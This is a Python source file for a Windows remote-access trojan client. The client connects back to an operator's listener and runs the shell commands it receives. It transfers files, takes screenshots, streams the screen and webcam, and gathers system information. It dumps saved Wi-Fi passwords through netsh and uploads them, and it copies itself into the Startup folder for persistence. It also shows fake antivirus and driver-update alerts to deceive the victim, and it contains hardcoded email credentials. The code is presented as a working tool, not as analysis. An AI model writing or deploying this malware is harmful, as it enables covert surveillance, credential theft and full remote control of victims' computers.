import socket
import json
import subprocess
import os
import shutil
import sys
import time
import re
import pyautogui, webbrowser
import keyboard, requests
import pyttsx3
from winotify import Notification, audio
from vidstream import ScreenShareClient, CameraClient
import threading, smtplib

engine = pyttsx3.init()
#ipaddress = socket.gethostbyname(socket.gethostname())
ipaddress = "127.0.0.1"
#ipaddress = "192.168.8.114"

def says(text):
  if text:
    engine.say(text)
    engine.runAndWait()

def make(command):
  execute = subprocess.Popen(command, shell=True,
                                       stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

  result = execute.stdout.read() + execute.stderr.read()
  print("result-y", result)
  result = result.decode()
  return result

def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def get_random_advice():
    res = requests.get("https://api.adviceslip.com/advice").json()
    return res['slip']['advice']

def steal_wifi():
    command = "netsh wlan show profile"
    result = make(command)
    value = "All User Profile     :([^\n]*)"
    patterns = re.findall(value, result)
    with open('progress.txt', 'a') as f:
        for i in patterns:
            ssid = i.strip('\n').strip(' ').strip('\r')
            commands = "netsh wlan show profile name=\""+ str(ssid) +"\" key=clear"
            results = make(commands)
            values = "Key Content            :([^\n]*)"
            patterns = re.findall(values, results)
            password = ''.join(patterns).strip(' ')
            if password == "":
                password = "None\n"
                need = f"{ssid} ==> {password}"
                f.write(need)
# def key():
#   global stop_flag
#   count = 0
#   while True:
#     if stop_flag:
#         break
#     e = keyboard.read_key()
#     if e == 'alt':
#         myscreenshot = pyautogui.screenshot()
#         myscreenshot.save('screenshot%d.png' % (count))
#         img_cv = cv2.imread('screenshot%d.png' % (count))
#         img_rgb = cv2.cvtColor(img_cv, cv2.COLOR_BGR2RGB)
#         print(pytesseract.image_to_string(img_rgb))
#         count+=1

# ths = threading.Thread(target = key)
# ths.start()

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def download_file(file_name):
    f = open(file_name, 'wb')
    s.settimeout(1)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    # s.close()

def s_message(text):
    toast = Notification(
                     app_id = "hackers",
                     title="information!!!",
                     msg = text)

    toast.set_audio(audio.Mail, loop=False)
    toast.show()

s_message("your graphic driver is outdated")

pyautogui.alert(title="antivirus", text="your graphic driver is outdated")

def upload_file(file_name):
    f = open(file_name, 'rb')
    s.send(f.read())


def screenshot():
    myscreenshot = pyautogui.screenshot()
    myscreenshot.save('screen.png')

def information():
    Id = subprocess.check_output(['systeminfo']).decode('utf-8').split('\n')
    new = []

    for item in Id:
        new.append(str(item.split("\r")[:-1]))
    for i in new:
        reliable_send(i[2:-2])

def shell():
    s_message("unable to open software because of graphic driver is outdated")

    pyautogui.alert(title="antivirus", text="unable to open software because of graphic driver is outdated")
    persist()
    while True:
        command = reliable_recv()
        if command == 'quit':
            try:
                sender.stop_stream()
                sender1.stop_stream()
            except:
                pass
            break
        elif command == " " or command == "":
            pass
        elif command[:7] == 'message':
            s_message(command[8:])
        elif command == 'cmd':
            os.system('start cmd')
        elif command == "notepad":
            os.startfile("C:\\Program Files\\Notepad++\\notepad++.exe")
        elif command == 'shutdown':
            subprocess.call(["shutdown", "/l"])
        elif command == 'clear':
            pass
        elif command == 'background':
            pass
        elif command == 'help':
            pass
        elif command.split()[0] == 'type':
            pass
        elif command == 'advice':
            try:
                advice = get_random_advice()
                says(advice)
            except requests.ConnectionError or requests.ConnectTimeout:
                reliable_send("target internet interruptted")
        elif command[:4] == 'open':
            webbrowser.open_new_tab(command[5:])
        elif command[:6] == 'upload':
            download_file(command[7:])
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:10] == 'screenshot':
            screenshot()
            upload_file('screen.png')
            os.remove('screen.png')
        elif command[:3] == 'cd ':
            os.chdir(command[3:])

        elif command[:4] == 'say ':
          says(command[5:])

        elif command == 'system information':
            information()

        elif command[:12] == 'wifipassword':
            steal_wifi()
            upload_file('progress.txt')
            os.remove('progress.txt')
        elif command == 'screenshare':
            sender = ScreenShareClient(ipaddress, 8888)
            th = threading.Thread(target=sender.start_stream())
            th.start()
        elif command == 'watch':
            sender1 = CameraClient(ipaddress, 8888)
            th1 = threading.Thread(target=sender1.start_stream())
            th1.start()

        elif command[:8] == 'execute ':
          result = make(command[9:])

        elif command[:7] == 'sendall':
          result = make(command[8:])
          reliable_send("done!!!")

        elif command[:10] == 'upgradeall':
            download_file(command[11:])
        else:
            print("command", command)
            result = make(command)
            print("result", result)
            reliable_send(result)
            

def connection():
    while True:
        time.sleep(20)
        try:
            s.connect((ipaddress, 5555))
            shell()
            s.close()
            break
        except:
            connection()


def persist():
    file_location = os.environ['appdata'] + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
    try:
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            os.remove(sys.executable)
            reliable_send('\n[+] created persistence')
        else:
            reliable_send('\n[+] persistence already existed')
    except:
        reliable_send('\n[-] Error creating persistence to the target machine')



def send_mail(msg):
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(user='malwarefinder3@gmail.com', password='3101331013')
        server.sendmail('malwarefinder3@gmail.com', 'malwarefinder3@gmail.com', msg = msg)
        server.quit()
    except:
        pass
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()